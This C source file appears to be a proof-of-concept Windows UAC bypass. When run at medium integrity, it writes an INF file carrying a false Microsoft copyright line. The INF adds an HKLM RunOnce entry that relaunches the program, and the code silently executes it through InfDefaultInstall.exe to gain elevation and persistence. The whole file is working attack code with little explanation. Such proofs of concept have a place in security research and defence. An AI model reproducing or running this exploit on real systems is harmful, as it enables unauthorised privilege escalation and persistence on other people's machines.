#include <stdio.h>
#include <windows.h>

// cl FunWithInfDefaultInstaaller.c Advapi32.lib Shell32.lib User32.lib

typedef enum {
	LOW_PROCESS,
	MEDIUM_PROCESS,
	HIGH_PROCESS,
	SYSTEM_PROCESS,
} IntegrityLevel;

IntegrityLevel ShowProcessIntegrityLevel()
{
	HANDLE hToken;
	HANDLE hProcess;
	DWORD dwLengthNeeded;
	DWORD dwError = ERROR_SUCCESS;
	PTOKEN_MANDATORY_LABEL pTIL = NULL;
	LPWSTR pStringSid;
	DWORD dwIntegrityLevel;
	IntegrityLevel retVal = -1;
 
	hProcess = GetCurrentProcess();
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) 
	{
		if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded))
		{
			dwError = GetLastError();
			if (dwError == ERROR_INSUFFICIENT_BUFFER)
			{
				pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLengthNeeded);
				if (pTIL != NULL)
				{
					if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded))
					{
						dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, 
						(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
						if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
						{
							printf("[+] Low Process!\n");
							retVal = LOW_PROCESS;
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
						{
							printf("[+] Medium Process\n");
							retVal = MEDIUM_PROCESS;
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
						{
							printf("[+] High Integrity Process\n");
							retVal = HIGH_PROCESS;
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
						{
							printf("[+] System Integrity Process\n");
							retVal = SYSTEM_PROCESS;
						}
					}
				LocalFree(pTIL);
				}
			}
		}
	CloseHandle(hToken);
	}
	return retVal;
}

BOOL WriteInf(VOID)
{
	BYTE InfContent[] = "; 61883.INF\n\
; Copyright (c) Microsoft Corporation.  All rights reserved.\n\
\n\
[Version]\n\
Signature = \"$CHICAGO$\"\n\
\n\
[DestinationDirs]\n\
DefaultDestDir = 1\n\
\n\
[DefaultInstall]\n\
AddReg = MOO\n\
\n\
[MOO]\n\
HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,%1%\\FunWithInfDefaultInstaaller.exe\n";
	HANDLE hFile;
	DWORD dwWritten;

    if ((hFile = CreateFileA("lol.inf", (GENERIC_READ | GENERIC_WRITE),
                             FILE_SHARE_READ | FILE_SHARE_READ,
                             NULL, CREATE_ALWAYS, 0, NULL)) == INVALID_HANDLE_VALUE)
	{
		printf("[-] CreateFileA failed : %u\n", GetLastError());
        return FALSE;
	}
    WriteFile(hFile, InfContent, strlen(InfContent), &dwWritten, NULL);
	CloseHandle(hFile);
	return TRUE;	
}

int main(int argc, char *argv[])
{
	BYTE bCMD[MAX_PATH];
	BYTE bCurDir[MAX_PATH];

	if (ShowProcessIntegrityLevel() == MEDIUM_PROCESS)
	{
		if (!GetCurrentDirectory(MAX_PATH - 1, bCurDir))
		{
			printf("[-] GetCurrentDirectory failed\n");
			return 1;
		}
		WriteInf();
		sprintf_s(bCMD, MAX_PATH - 1, "\"%s\\lol.inf\"", bCurDir);
		ShellExecute(NULL, "open", "C:\\Windows\\System32\\InfDefaultInstall.exe", bCMD, NULL, SW_HIDE);
	}
	else
	{
		MessageBoxA(NULL, "A", "A", 0);
	}
	return 0;
}